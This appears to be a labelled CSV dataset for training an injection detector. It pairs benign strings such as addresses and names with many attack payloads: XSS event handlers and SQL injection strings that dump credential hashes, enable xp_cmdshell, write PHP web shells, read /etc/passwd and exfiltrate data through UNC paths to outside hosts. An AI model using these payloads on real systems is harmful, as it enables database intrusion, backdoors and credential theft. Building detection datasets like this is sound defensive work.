payload,label
onpagehide@XSS Keys,anom
onpageshow@XSS Keys,anom
onplay@XSS Keys,anom
onplaying@XSS Keys,anom
onratechange@XSS Keys,anom
onseeked@XSS Keys,anom
onseeking@XSS Keys,anom
onsuspend@XSS Keys,anom
onwaiting@XSS Keys,anom
onwheel@XSS Keys,anom
http://@XSS Keys,anom
c/ caridad s/n,norm
"campello, el",norm
40184,norm
1.44E+15,norm
nue37,norm
nuda drudes,norm
tufts3@joll.rs,norm
22997112x,norm
"c/ del ferrocarril, 152,",norm
arenas de san juan,norm
19245,norm
2.07E+15,norm
fennell,norm
d50allecido,norm
1902,norm
genny,norm
03248i367ca,norm
"(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",anom
"'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",anom
"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",anom
"' and updatexml(null,concat(0x0a,version()),null)-- -",anom
"' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",anom
"?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--",anom
"convert(int,@@version)",anom
cast((SELECT @@version) as int),anom
"' + convert(int,@@version) + '",anom
' + cast((SELECT @@version) as int) + ',anom
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual,anom
"SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual",anom
"SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual",anom
"SELECT to_char(dbms_xmlgen.getxml('select ""'||(select user from sys.dual)||'"" FROM sys.dual')) FROM dual",anom
"SELECT rtrim(extract(xmlagg(xmlelement(""s"", username || ',')),'/s').getstringval(),',') FROM all_users",anom
",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)",anom
",cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",anom
",cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",anom
",cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)",anom
"' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",anom
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
SELECT name FROM master..sysdatabases,anom
SELECT name FROM Injection..sysobjects WHERE xtype = 'U',anom
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users'),anom
"SELECT  UserId, UserName from Users",anom
"1' UNION SELECT 1,2,3--+",anom
"1' UNION SELECT @,@,@--+",anom
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%',anom
"WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)",anom
SELECT message FROM data WHERE row = 1 and message like 't%',anom
"?id=1 and substring(version(),1,1)=5",anom
"?id=1 and right(left(version(),1),1)=5",anom
"?id=1 and left(version(),1)=4",anom
"?id=1 and ascii(lower(substr(Version(),1,1)))=51",anom
"?id=1 and (select mid(version(),1,1)=4)",anom
"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",anom
"?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",anom
"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",anom
"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",anom
"AND MAKE_SET(YOLO<(SELECT(length(version()))),1)",anom
"AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)",anom
"AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)",anom
"AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)",anom
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';,anom
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';,anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual),anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);,anom
SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';,anom
SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%';,anom
ProductID=1;waitfor delay '0:0:10'--,anom
ProductID=1);waitfor delay '0:0:10'--,anom
ProductID=1';waitfor delay '0:0:10'--,anom
ProductID=1');waitfor delay '0:0:10'--,anom
ProductID=1));waitfor delay '0:0:10'--,anom
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',anom
"+BENCHMARK(40000000,SHA1(1337))+",anom
"'%2Bbenchmark(3200,SHA1(1))%2B'",anom
"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1",anom
RLIKE SLEEP([SLEEPTIME]),anom
"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",anom
1 and (select sleep(10) from dual where database() like '%')#,anom
1 and (select sleep(10) from dual where database() like '___')# ,anom
1 and (select sleep(10) from dual where database() like '____')#,anom
1 and (select sleep(10) from dual where database() like '_____')#,anom
1 and (select sleep(10) from dual where database() like 'a____')#,anom
1 and (select sleep(10) from dual where database() like 's____')#,anom
1 and (select sleep(10) from dual where database() like 'sa___')#,anom
1 and (select sleep(10) from dual where database() like 'sw___')#,anom
1 and (select sleep(10) from dual where database() like 'swa__')#,anom
1 and (select sleep(10) from dual where database() like 'swb__')#,anom
1 and (select sleep(10) from dual where database() like 'swi__')#,anom
"1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#",anom
"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",anom
"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --",anom
"?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",anom
"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",anom
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),anom
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))     ",anom
ATTACH DATABASE '/var/www/lol.php' AS lol;,anom
CREATE TABLE lol.pwn (dataz text);,anom
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--     ,anom
SELECT @@version,anom
SELECT DB_NAME(),anom
SELECT name FROM master..sysdatabases;,anom
"SELECT DB_NAME(N); — for N = 0, 1, 2, …",anom
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only,anom
"SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable",anom
"SELECT table_catalog, column_name FROM information_schema.columns",anom
"SELECT name, password FROM master..sysxlogins",anom
"SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)",anom
"SELECT name, password_hash FROM master.sys.sql_logins",anom
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins,anom
ProductID=1; DROP members--,anom
"EXEC xp_cmdshell ""net user"";",anom
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';,anom
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';,anom
"EXEC sp_configure 'show advanced options',1;",anom
RECONFIGURE;,anom
"EXEC sp_configure 'xp_cmdshell',1;",anom
RECONFIGURE;,anom
sqsh -S 192.168.1.X -U sa -P superPassword,anom
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758,anom
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- ,anom
"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",anom
1' ORDER BY 1--+,anom
1' ORDER BY 2--+,anom
1' ORDER BY 3--+,anom
1' ORDER BY 4--+,anom
1' GROUP BY 1--+,anom
1' GROUP BY 2--+,anom
1' GROUP BY 3--+,anom
1' GROUP BY 4--+,anom
1' UNION SELECT @--+       ,anom
"1' UNION SELECT @,@--+ ",anom
"1' UNION SELECT @,@,@--+ ",anom
"1' LIMIT 1,1 INTO @--+  ",anom
"1' LIMIT 1,1 INTO @,@--+ ",anom
"1' LIMIT 1,1 INTO @,@,@--+ ",anom
1' AND (SELECT * FROM Users) = 1--+ ,anom
"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata",anom
"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...",anom
"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...",anom
"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...",anom
ProductID=1; DROP members--,anom
"EXEC xp_cmdshell ""net user"";",anom
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';,anom
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';,anom
"EXEC sp_configure 'show advanced options',1;",anom
RECONFIGURE;,anom
"EXEC sp_configure 'xp_cmdshell',1;",anom
RECONFIGURE;,anom
sqsh -S 192.168.1.X -U sa -P superPassword,anom
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758,anom
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- ,anom
"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",anom
?id=(1)and(SELECT * from db.users)=(1),anom
"?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)",anom
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a,anom
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a,anom
"-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a",anom
"select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;",anom
"MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);",anom
"(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",anom
"(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",anom
"make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",anom
"(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",anom
"(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",anom
"(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",anom
"+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",anom
"(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",anom
"+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f",anom
"+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f66",anom
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3,anom
"(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",anom
"union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",anom
"union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #",anom
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --,anom
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#,anom
"[...] UNION SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\backdoor.php""",anom
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>',anom
"[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -",anom
"[...] union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",anom
"[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",anom
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';,anom
`username` varchar(20) not null,anom
/usr/lib/lib_mysqludf_sys.so,anom
SELECT sys_eval('id');,anom
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';,anom
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt,anom
"select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));",anom
"select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))",anom
select load_file('\\\\error\\abc');,anom
select load_file(0x5c5c5c5c6572726f725c5c616263);,anom
select 'osanda' into dumpfile '\\\\error\\abc';,anom
select 'osanda' into outfile '\\\\error\\abc';,anom
load data infile '\\\\error\\abc' into table database.table_name;,anom
SELECT user FROM dual UNION SELECT * FROM v$version,anom
SELECT global_name FROM global_name;,anom
SELECT name FROM V$DATABASE;,anom
SELECT instance_name FROM V$INSTANCE;,anom
SELECT SYS.DATABASE_NAME FROM DUAL;,anom
SELECT DISTINCT owner FROM all_tables;,anom
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';,anom
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';,anom
SELECT table_name FROM all_tables;,anom
"SELECT owner, table_name FROM all_tables;",anom
"SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';",anom
"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",anom
"BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named ""PwnUtil"" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = """";while ((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = """";while((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END;",anom
BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END;,anom
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,anom
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));,anom
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual,anom
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,anom
SELECT version(),anom
SELECT user;,anom
SELECT current_user;,anom
SELECT session_user;,anom
SELECT usename FROM pg_user;,anom
SELECT getpgusername();,anom
SELECT usename FROM pg_user,anom
"SELECT usename, passwd FROM pg_shadow",anom
SELECT usename FROM pg_user WHERE usesuper IS TRUE,anom
"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user",anom
SELECT current_database(),anom
SELECT datname FROM pg_database,anom
SELECT table_name FROM information_schema.tables,anom
SELECT column_name FROM information_schema.columns WHERE table_name='data_table',anom
"' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK",anom
"' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO",anom
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),anom
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",anom
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--,anom
select pg_ls_dir('./');,anom
"select pg_read_file('PG_VERSION', 0, 200);",anom
CREATE TABLE temp(t TEXT);,anom
